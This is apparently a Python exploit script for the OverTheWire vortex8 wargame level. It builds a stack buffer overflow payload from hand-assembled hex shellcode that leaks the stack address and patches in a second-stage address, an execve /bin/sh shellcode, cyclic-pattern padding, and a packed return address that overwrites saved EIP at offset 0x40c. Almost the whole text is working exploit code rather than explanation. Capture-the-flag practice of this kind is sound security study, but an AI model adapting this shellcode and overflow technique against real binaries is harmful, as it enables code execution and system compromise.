# OTW vortex8

import struct

# XXX start of buffer is at 0xffffce90, found by experimentation
# XXX Update this as it moves around, set to something like 0x01020304 to trigger crash and then look at esp and for our buf
#ADDR = 0xffffce90
ADDR = 0xffffd630

# getesp.asm shellcode written by hand compiled with NASM
#shellcode1 = "eb5d5e89f131d2b20431db4331c0b004cd8089f0040589c589e02c089489c75685c0741389c683e60f4e0fb65c35014f881fc1e804ebe95e89f931d2b20831db4331c0b004cd8089f180c10431d24231db4331c0b004cd8031db31c040cd80e89effffff455350201030313233343536373839616263646566".decode('hex')

def make_shellcode(addr=ADDR):
	"""
	Make the shellcode buffer (arg1 for vortex8)
	addr is the address the shellcode will start at, this is what we'll overwrite the saved return addr with
	"""
	# fake sc_addr for now, need to get length of this shellcode
	shellcode1 = 'eb685e89f131d2b20431db4331c0b004cd8089f0040589c589e02c089489c75685c0741389c683e60f4e0fb65c35014f881fc1e804ebe95e89f931d2b20831db4331c0b004cd8089f180c10431d24231db4331c0b004cd80bb0ca00408c703{sc2_addr}31db31c040cd80e893ffffff455350201030313233343536373839616263646566'.format(sc2_addr='deadbeef').decode('hex')

	# r2 exec /bin/sh shellcode
	shellcode2 = '31c050682f2f7368682f62696e89e3505389e199b00bcd80'.decode('hex')

	pattern = "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAF"
	# crash EIP is: -
	# [0x00000000]> wopO 0x41704641
	# 1036
	# 0x40c

	# length of buffer before we append return address
	buf_len = 0x40c 
	# how much space we need to pad
	plen = buf_len - len(shellcode1) - len(shellcode2)
	if plen < 0:
	    raise RuntimeError("shellcodes too long!")

	addrle = struct.pack('<L',addr)

	shellcode2_addr = addr + len(shellcode1)
	# we need it in hex, because later we'll decode the hex
	shellcode2_addr_le = struct.pack('<L',shellcode2_addr).encode('hex')

	# fix sc2_addr
	shellcode1 = 'eb685e89f131d2b20431db4331c0b004cd8089f0040589c589e02c089489c75685c0741389c683e60f4e0fb65c35014f881fc1e804ebe95e89f931d2b20831db4331c0b004cd8089f180c10431d24231db4331c0b004cd80bb0ca00408c703{sc2_addr}31db31c040cd80e893ffffff455350201030313233343536373839616263646566'.format(sc2_addr=shellcode2_addr_le).decode('hex')

	buf = shellcode1 + shellcode2 + pattern[:plen] + addrle
	return buf
